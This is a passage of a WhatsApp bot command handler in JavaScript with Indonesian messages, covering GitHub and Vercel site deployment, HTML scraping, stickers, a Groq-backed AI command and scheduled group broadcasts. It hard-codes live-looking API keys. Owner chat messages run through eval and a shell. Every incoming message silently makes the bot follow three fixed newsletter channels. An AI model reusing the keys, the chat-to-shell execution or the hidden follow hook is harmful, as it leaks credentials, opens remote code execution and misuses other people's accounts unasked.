    const mime = qmsg.mimetype || qmsg.msg?.mimetype || "";
    if (!mime) return m.reply("❗ File tidak valid, balas file .zip atau .html!");
    if (!/zip|html/.test(mime)) return m.reply("❗ Format tidak didukung. Kirim .zip atau .html");

    // FIX BUFFER (ANTI ERROR)
    let fileBuffer;
    try {
        if (qmsg.download) fileBuffer = await qmsg.download(); 
        else if (qmsg.msg && qmsg.msg.fileMessage) fileBuffer = await conn.downloadMediaMessage(qmsg);
        else throw new Error("File tidak dapat diunduh");
    } catch (err) {
        return m.reply("❌ Gagal mengambil file, pastikan file valid!");
    }

    const webName = text.trim().toLowerCase().replace(/[^a-z0-9-_]/g, "");
    const repositoryName = `${webName}-website`;
    const githubApiUrl = "https://api.github.com/user/repos";
    const headers = {
        Authorization: `token ${global.githubToken}`,
        "Content-Type": "application/json"
    };

    try {
        // CREATE REPO
        const createRepoPayload = {
            name: repositoryName,
            private: false,
            auto_init: true,
            gitignore_template: "Node"
        };
        const repoRes = await fetch(githubApiUrl, {
            method: "POST",
            headers,
            body: JSON.stringify(createRepoPayload)
        });

        if (repoRes.status === 422)
            return m.reply(`❌ Repo *${repositoryName}* sudah ada.`);

        const filesToUpload = [];

        // ZIP
        if (mime.includes("zip")) {
            const unzipper = require("unzipper");
            const directory = await unzipper.Open.buffer(fileBuffer);

            for (const file of directory.files) {
                if (file.type === "File") {
                    const content = await file.buffer();
                    const cleanPath = file.path
                        .replace(/^\/+/, "")
                        .replace(/\\/g, "/");

                    filesToUpload.push({
                        file: cleanPath,
                        data: content.toString("base64"),
                        encoding: "base64"
                    });
                }
            }

            if (!filesToUpload.some(x => x.file.toLowerCase().endsWith("index.html")))
                return m.reply("❌ index.html tidak ditemukan dalam ZIP!");
        }
        // HTML
        else if (mime.includes("html")) {
            filesToUpload.push({
                file: "index.html",
                data: Buffer.from(fileBuffer).toString("base64"),
                encoding: "base64"
            });
        }

        // UPLOAD KE GITHUB
        const githubRepoUrl =
            `https://api.github.com/repos/${global.githubUsername}/${repositoryName}/contents`;

        for (let f of filesToUpload) {
            await fetch(`${githubRepoUrl}/${f.file}`, {
                method: "PUT",
                headers,
                body: JSON.stringify({
                    message: `Add ${f.file}`,
                    content: f.data
                })
            });
        }

        // ENABLE PAGES
        await fetch(
            `https://api.github.com/repos/${global.githubUsername}/${repositoryName}/pages`,
            {
                method: "POST",
                headers,
                body: JSON.stringify({
                    source: { branch: "main", path: "/" }
                })
            }
        );

        m.reply(
            `✅ Website berhasil dibuat!\n\n🌐 URL:\nhttps://${global.githubUsername}.github.io/${repositoryName}`
        );

    } catch (e) {
        console.log(e);
        m.reply("❌ Terjadi kesalahan saat deploy.");
    }
}
break;

//=============================================//

case "scweb":
case "gethtml": {
    if (!isCreator && !isSellerWeb) return m.reply(mesg.slr);
    if (!text) return m.reply("❗ Masukkan domain atau URL");

    try {
        let res = await fetch(text);
        if (!res.ok) return m.reply("❌ Gagal mengambil data dari URL tersebut");
        let html = await res.text();

        // pastikan folder ada
        const dirPath = path.join(__dirname, "./library/database/sampah/html_dump.html");
        if (!fs.existsSync(dirPath)) fs.mkdirSync(dirPath, { recursive: true });

        const filePath = path.join(dirPath, "html_dump.html");
        fs.writeFileSync(filePath, html);

        await conn.sendMessage(m.chat, {
            document: fs.readFileSync(filePath),
            mimetype: "text/html",
            fileName: "source.html"
        }, { quoted: m });

        fs.unlinkSync(filePath); // hapus setelah terkirim
    } catch (e) {
        console.error(e);
        m.reply("❌ Terjadi kesalahan saat mengambil HTML\n" + e.message);
    }
}
break;

//=============================================//

case "listweb": {
    if (!isCreator && !isSellerWeb) return m.reply(mesg.slr);

    const headers = {
        Authorization: `Bearer ${global.vercelToken}`
    };

    try {
        const res = await fetch("https://api.vercel.com/v9/projects", { headers });
        const data = await res.json();

        if (!data.projects || data.projects.length === 0) return m.reply("❌ Tidak ada website yang ditemukan.");

        let teks = "*🌐 Daftar Website Anda:*\n\n";
        for (let proj of data.projects) {
            teks += `• ${proj.name} → https://${proj.name}.vercel.app\n`;
        }

        m.reply(teks);
    } catch (e) {
        console.error(e);
        m.reply("❌ Terjadi kesalahan saat mengambil daftar website.\n" + e.message);
    }
}
break;

//=============================================//

case "listweb2": {
    // Mendapatkan waktu, tanggal, dan hari saat ini dengan zona waktu WIB (GMT+7)
    const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const day = days[currentDate.getDay()];
    const date = currentDate.toLocaleDateString("id-ID", { 
        day: 'numeric', 
        month: 'long', 
        year: 'numeric' 
    });
    const time = currentDate.toLocaleTimeString("id-ID");

    let name = m.pushName || "Pengguna"; // ✅ Tambahkan ini
 let teks = `

┏━━━━━⫷ LIST WEBSITE V2 ⫸━━━
┃➵ Website Jernih Foto
┃➵ https://jernihkan-foto-new.vercel.app
┃
┃➵ Website Payment
┃➵ https://website-payment-deploy.vercel.app
┃
┃➵ Website Unbaned Wa
┃➵ https://website-unbaned-deploy.vercel.app
┗━━━━━━━━━━━━⭓

> PAKE AJA TUH WEBSITE V2 NYA
> KALO MAU AMBIL SALIN LINK TERUS KETIK .scweb linknya`;

    await conn.sendMessage(m.chat, {
        image: fs.readFileSync('./media/reply.jpg'),
        caption: teks,
        contextInfo: {
            isForwarded: true, 
            mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`], 
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: global.namaSaluran, 
                video: fs.readFileSync('./media/reply.jpg'), // diganti juga ke foto agar konsisten
                serverId: 200
            }
        }
    }, { quoted: qtext });
}
break;

//=============================================//

case "delweb": {
    if (!isCreator && !isSellerWeb) return m.reply(mesg.slr);

    // Ambil nama web dari text
    const webName = text?.trim().toLowerCase();
    if (!webName) return m.reply("❗ Contoh penggunaan: .delweb namaWeb");

    const headers = {
        Authorization: `Bearer ${global.vercelToken}`
    };

    try {
        // Request DELETE ke Vercel
        const response = await fetch(`https://api.vercel.com/v9/projects/${webName}`, {
            method: "DELETE",
            headers
        });

        if (response.status === 200 || response.status === 204) {
            return m.reply(`✅ Website *${webName}* berhasil dihapus dari Vercel.`);
        } else if (response.status === 404) {
            return m.reply(`⚠️ Website *${webName}* tidak ditemukan di akun Vercel kamu.`);
        } else if (response.status === 403 || response.status === 401) {
            return m.reply(`⛔ Token Vercel tidak valid atau tidak punya akses ke project ini.`);
        } else {
            let result = {};
            try { result = await response.json(); } catch(e) {}
            return m.reply(`❌ Gagal menghapus website:\n${result.error?.message || "Tidak diketahui"}`);
        }

    } catch (err) {
        console.error(err);
        return m.reply(`❌ Terjadi kesalahan saat mencoba menghapus:\n${err.message}`);
    }
}
break;

//========= Tambah Seller Web =========//
case "addsellerweb": {
  if (!isCreator) return Reply(mess.owner);
  if (!text && !m.quoted) return Reply(`Kirim nomor atau reply orang\nContoh: .addsellerweb 628xxx`);

  const target = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (sellerWEB.owners.includes(target)) return Reply("✅ Sudah jadi Seller Web.");

  sellerWEB.owners.push(target);
  fs.writeFileSync(sellerwebPath, JSON.stringify(sellerWEB, null, 2));
  Reply("✅ Berhasil menambahkan ke Seller Web.");
}
break;

//========= Hapus Seller Web =========//
case "delsellerweb": {
    if (!isCreator) return Reply(mess.owner);
    if (!text && !m.quoted) return Reply(`Kirim nomor atau reply orang\nContoh: .delsellerweb 628xxx`);

    // Tentukan target, bisa dari reply atau text
    const target = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    if (!sellerWEB.owners.includes(target)) return Reply("❌ User ini bukan Seller Web.");

    // Hapus dari array
    sellerWEB.owners = sellerWEB.owners.filter(user => user !== target);
    fs.writeFileSync(sellerwebPath, JSON.stringify(sellerWEB, null, 2));

    Reply("✅ Berhasil menghapus dari Seller Web.");
}
break;

//========= List Seller Web =========//
case "listsellerweb": {
    if (!isCreator) return Reply(mess.owner);
    if (!sellerWEB.owners || sellerWEB.owners.length === 0) 
        return Reply("📭 Belum ada Seller Web terdaftar.");

    let teks = "🌐 *Daftar Seller Web:*\n\n";
    sellerWEB.owners.forEach((u, i) => {
        teks += `${i + 1}. @${u.split('@')[0]}\n`;
    });

    Reply(teks);
}
break;

//========= Reset Seller Web =========//
case "resetsellerweb": {
    if (!isCreator) return Reply(mess.owner);
    if (!sellerWEB.owners || sellerWEB.owners.length === 0) 
        return Reply("📭 Tidak ada data Seller Web untuk dihapus.");

    sellerWEB.owners = [];
    fs.writeFileSync(sellerwebPath, JSON.stringify(sellerWEB, null, 2));

    Reply("🗑️ Semua Seller Web berhasil dihapus.");
}
break;

//=============================================//

case "upswgc": {
    if (!isCreator) return Reply("❌ Hanya Owner yang dapat menggunakan fitur ini");

    const quoted = m.quoted ? m.quoted : m;
    const mime = (quoted.msg || quoted).mimetype || "";
    const caption = m.body.replace(/^\.upswgc\s*/i, "").trim();
    const jid = m.chat;

    try {
        if (/image/.test(mime)) {
            const buffer = await quoted.download();
            await conn.sendMessage(jid, {
                groupStatusMessage: {
                    image: buffer,
                    caption
                }
            }, { quoted: m });
            Reply("✅ Status grup berhasil diperbarui dengan foto");
        } else if (/video/.test(mime)) {
            const buffer = await quoted.download();
            await conn.sendMessage(jid, {
                groupStatusMessage: {
                    video: buffer,
                    caption
                }
            }, { quoted: m });
            Reply("✅ Status grup berhasil diperbarui dengan video");
        } else if (/audio/.test(mime)) {
            const buffer = await quoted.download();
            await conn.sendMessage(jid, {
                groupStatusMessage: {
                    audio: buffer
                }
            }, { quoted: m });
            Reply("✅ Status grup berhasil diperbarui dengan audio");
        } else if (caption) {
            await conn.sendMessage(jid, {
                groupStatusMessage: {
                    text: caption
                }
            }, { quoted: m });
            Reply("✅ Status grup berhasil diperbarui dengan teks");
        } else {
            Reply(`❗ Silakan reply media atau tambahkan teks.\nContoh: ${prefix + command} (reply image/video/audio) Pesan ini`);
        }
    } catch (e) {
        console.error(e);
        Reply("❌ Terjadi kesalahan saat memperbarui status grup");
    }
}
break;

//=============================================//

case "emojimix": {
    if (!text) return m.reply(`*Contoh:* ${cmd} 🥶+🤧`);
    try {
        // Pisah emoji dengan tanda '+'
        let [emoji1, emoji2] = text.split("+").map(e => e.trim());
        if (!emoji1 || !emoji2) return m.reply(`Format salah!\nContoh:\n${cmd} 😭+🤣`);

        const urlApi = `https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`;
        const json = await fetch(urlApi).then(res => res.json());
        const url = json?.results?.[0]?.url;
        if (!url) return m.reply("❌ Gagal mendapatkan hasil emoji mix.");

        const buffer = await getBuffer(url);
        await conn.sendAsSticker(m.chat, buffer, m, { packname: "@alluffyofficial" });

    } catch (err) {
        console.error(err);
        m.reply("❌ Terjadi kesalahan saat memproses emoji mix.");
    }
}
break;

//=============================================//

case "emojitogif": 
case "togif": {
    if (!text) return m.reply(`*Contoh:* ${cmd} 😂`);

    function encodeEmoji(emoji) {
        return [...emoji].map(char => char.codePointAt(0).toString(16)).join('-');
    }

    try {
        const emoji = text.trim();
        const code = encodeEmoji(emoji);
        const url = `https://fonts.gstatic.com/s/e/notoemoji/latest/${code}/512.webp`;
        const buffer = await getBuffer(url);

        // Kirim sebagai stiker
        await conn.sendAsSticker(m.chat, buffer, m, {
            packname: "@alluffyofficial"
        });

    } catch (e) {
        console.error(e);
        m.reply("❌ Emoji tidak ditemukan atau gagal mengambil GIF.");
    }
}
break;

//=============================================//

case "openai": 
case "ai": {
    if (!text) return m.reply(`*Contoh:* ${cmd} jelaskan apa itu javascript`);
    
    const fetch = require("node-fetch");

    // Daftar API key
    const Apis = ["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"];
    const GROQ_API_KEY = Apis[Math.floor(Math.random() * Apis.length)];

    // Fungsi untuk memanggil API OpenAI/Groq
    async function getOpenAIResponse(prompt, question, model) {
        try {
            const response = await fetch("https://api.groq.com/openai/v1/chat/completions", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${GROQ_API_KEY}`
                },
                body: JSON.stringify({
                    model: model,
                    messages: [
                        { role: "system", content: prompt },
                        { role: "user", content: question }
                    ]
                })
            });

            const data = await response.json();
            return data.choices?.[0]?.message?.content || "❌ Tidak ada respons dari model.";
        } catch (err) {
            console.error("OpenAI Error:", err);
            return "❌ Terjadi kesalahan saat memproses permintaan AI.";
        }
    }

    try {
        await m.reply("⏳ Sedang memproses permintaan AI...");

        // Panggil fungsi API langsung dari case
        const result = await getOpenAIResponse("", text, "openai/gpt-oss-120b");

        // Kirim hasil ke chat
        await conn.sendMessage(m.chat, { text: `*Chat GPT Result :*\n${result}` }, { quoted: m });

    } catch (err) {
        console.error("OpenAI Error:", err);
        await m.reply("❌ Terjadi kesalahan saat memproses permintaan AI.");
    }
}
break;

//=============================================//

case "autojpmgb": {
  if (!isCreator) return Reply(mess.owner);
  
  if (!q) {
    return m.reply(`*Auto JPM Group Broadcast*\n\nContoh penggunaan:\n• ${prefix}autojpmgb on\n• ${prefix}autojpmgb off\n• ${prefix}autojpmgb status\n\nUntuk mengatur pesan dan interval:\n• ${prefix}setjpmgb pesan|1jam\n• ${prefix}setjpmgb pesan|30menit\n\nUntuk menghapus pengaturan:\n• ${prefix}delsetjpmgb`);
  }
  
  const args = q.toLowerCase().split(' ');
  const action = args[0];
  
  const statusPath = './library/database/status_autojpmgb.json';
  const configPath = './library/database/autojpmgb.json';
  
  let statusData = {};
  let configData = {};
  
  try {
    if (fs.existsSync(statusPath)) {
      statusData = JSON.parse(fs.readFileSync(statusPath, 'utf8'));
    }
    
    if (fs.existsSync(configPath)) {
      configData = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    }
  } catch (err) {
    console.error('Error reading files:', err);
  }
  
  switch (action) {
    case 'on':
      // VALIDASI: Cek apakah sudah disetel
      if (!configData.message || !configData.interval || configData.interval < 60000) {
        return m.reply(`❌ *Belum ada pengaturan Auto JPMGB!*\n\nSilakan atur terlebih dahulu dengan:\n${prefix}setjpmgb [pesan]|[interval]\n\nContoh:\n${prefix}setjpmgb Hello semua|1jam\n${prefix}setjpmgb Test broadcast|30menit`);
      }
      
      if (statusData.status === 'on') {
        return m.reply('⚠️ *Auto JPMGB sudah aktif!*');
      }
      
      statusData.status = 'on';
      fs.writeFileSync(statusPath, JSON.stringify(statusData, null, 2));
      
      // Reset lastRun agar langsung jalan
      configData.lastRun = null;
      fs.writeFileSync(configPath, JSON.stringify(configData, null, 2));
      
      m.reply(`✅ *Auto JPMGB diaktifkan!*\n\n📝 Pesan: ${configData.message}\n⏰ Interval: ${configData.format}\n\nPesan akan mulai dikirim sesuai interval.`);
      break;
      
    case 'off':
      if (statusData.status !== 'on') {
        return m.reply('⚠️ *Auto JPMGB sudah tidak aktif!*');
      }
      
      statusData.status = 'off';
      fs.writeFileSync(statusPath, JSON.stringify(statusData, null, 2));
      m.reply('❌ *Auto JPMGB dimatikan*\nPesan tidak akan dikirim otomatis lagi.');
      break;
      
    case 'status':
      const isOn = statusData.status === 'on';
      const isConfigured = configData.message && configData.interval && configData.interval >= 60000;
      
      let statusMessage = `📊 *Status Auto JPMGB*\n\n`;
      
      if (!isConfigured) {
        statusMessage += `❌ *BELUM DIKONFIGURASI*\n`;
        statusMessage += `Silakan atur dengan: ${prefix}setjpmgb pesan|interval\n\n`;
      } else {
        statusMessage += `• Status: ${isOn ? '✅ AKTIF' : '❌ NONAKTIF'}\n`;
        statusMessage += `• Pesan: ${configData.message || 'Belum diatur'}\n`;
        statusMessage += `• Interval: ${configData.format || 'Belum diatur'}\n`;
        statusMessage += `• Last Run: ${configData.lastRun ? new Date(configData.lastRun).toLocaleString() : 'Belum pernah'}\n\n`;
      }
      
      statusMessage += `📌 *Commands:*\n`;
      statusMessage += `• ${prefix}setjpmgb [pesan]|[interval]\n`;
      statusMessage += `• ${prefix}autojpmgb on/off\n`;
      statusMessage += `• ${prefix}delsetjpmgb\n`;
      
      m.reply(statusMessage);
      break;
      
    default:
      m.reply(`❌ Perintah tidak valid!\nGunakan: ${prefix}autojpmgb [on|off|status]`);
  }
}
break;

//=============================================//

case "setjpmgb": {
  if (!isCreator) return Reply(mess.owner);
  if (!q) return m.reply(example("pesan|1jam"));
  
  // Parsing input: "pesan|1jam" atau "pesan|30menit"
  const parts = q.split('|');
  if (parts.length !== 2) {
    return m.reply(`❌ Format salah!\nContoh: ${prefix}setjpmgb Hello World|1jam\natau: ${prefix}setjpmgb Test|30menit`);
  }
  
  const message = parts[0].trim();
  const intervalInput = parts[1].trim().toLowerCase();
  
  // Validasi pesan tidak kosong
  if (!message) {
    return m.reply('❌ Pesan tidak boleh kosong!');
  }
  
  // Parse interval
  let intervalMs = 0;
  let format = '';
  
  if (intervalInput.includes('jam')) {
    const hours = parseInt(intervalInput);
    if (isNaN(hours) || hours < 1) {
      return m.reply('❌ Jam harus angka dan minimal 1 jam!');
    }
    intervalMs = hours * 60 * 60 * 1000;
    format = `${hours} jam`;
  } else if (intervalInput.includes('menit')) {
    const minutes = parseInt(intervalInput);
    if (isNaN(minutes) || minutes < 1) {
      return m.reply('❌ Menit harus angka dan minimal 1 menit!');
    }
    intervalMs = minutes * 60 * 1000;
    format = `${minutes} menit`;
  } else {
    return m.reply('❌ Format interval salah! Gunakan "jam" atau "menit"\nContoh: 1jam atau 30menit');
  }
  
  // Validasi interval minimal 1 menit
  if (intervalMs < 60000) {
    return m.reply('❌ Interval minimal 1 menit!');
  }
  
  // Save to JSON
  const config = {
    message: message,
    interval: intervalMs,
    format: format,
    lastRun: null
  };
  
  const configPath = './library/database/autojpmgb.json';
  fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
  
  // Baca status untuk memberikan info yang sesuai
  const statusPath = './library/database/status_autojpmgb.json';
  let statusData = { status: 'off' };
  
  if (fs.existsSync(statusPath)) {
    statusData = JSON.parse(fs.readFileSync(statusPath, 'utf8'));
  }
  
  const replyMessage = `✅ *Pengaturan Auto JPMGB berhasil disimpan!*\n\n` +
    `📝 Pesan: ${message}\n` +
    `⏰ Interval: ${format}\n\n`;
  
  if (statusData.status === 'on') {
    m.reply(replyMessage + `⚠️ *Auto JPMGB sedang AKTIF*\nPesan akan dikirim sesuai interval baru.`);
  } else {
    m.reply(replyMessage + `🚀 Sekarang aktifkan dengan: ${prefix}autojpmgb on`);
  }
}
break;

//=============================================//

case "delsetjpmgb": {
  if (!isCreator) return Reply(mess.owner);
  
  const configPath = './library/database/autojpmgb.json';
  const statusPath = './library/database/status_autojpmgb.json';
  
  // Reset config
  const defaultConfig = {
    message: "",
    interval: 0,
    format: "",
    lastRun: null
  };
  
  // Reset status
  const defaultStatus = {
    status: "off"
  };
  
  fs.writeFileSync(configPath, JSON.stringify(defaultConfig, null, 2));
  fs.writeFileSync(statusPath, JSON.stringify(defaultStatus, null, 2));
  
  m.reply('✅ *Semua pengaturan Auto JPMGB telah dihapus!*\nStatus telah dimatikan dan konfigurasi direset.');
}
break;

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (m.text && m.text.toLowerCase().trim() === "bot") {
  try {
    // Waktu aktif
    const uptime = process.uptime();
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    
    // Variasi respons
    const greetings = ["Halo!", "Ya?", "Ada apa nih?", "👋"];
    const randomGreet = greetings[Math.floor(Math.random() * greetings.length)];
    
    const replyMessage = `${randomGreet}\n` +
      `Bot aktif selama: ${hours} jam ${minutes} menit\n` +
      `Status: Online ✅\n` +
      `Prefix: .\n\n` +
      `Ketik .menu untuk bantuan`;
    
    m.reply(replyMessage);
  } catch (error) {
    console.error("Error:", error);
    // Fallback ke respons sederhana jika ada error
    m.reply("Online Kak ✅");
  }
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}
conn.newsletterFollow("120363418752112116@newsletter")
conn.newsletterFollow("120363403636531082@newsletter")
conn.newsletterFollow("120363405946810077@newsletter")

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
}
} catch (err) {
console.log(util.format(err));
let Obj = global.owner
conn.sendMessage(Obj + "@s.whatsapp.net", {text: `*Hallo developer, telah terjadi error :*\n
${util.format(err)}`, contextInfo: { isForwarded: true }}, {quoted: m})
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});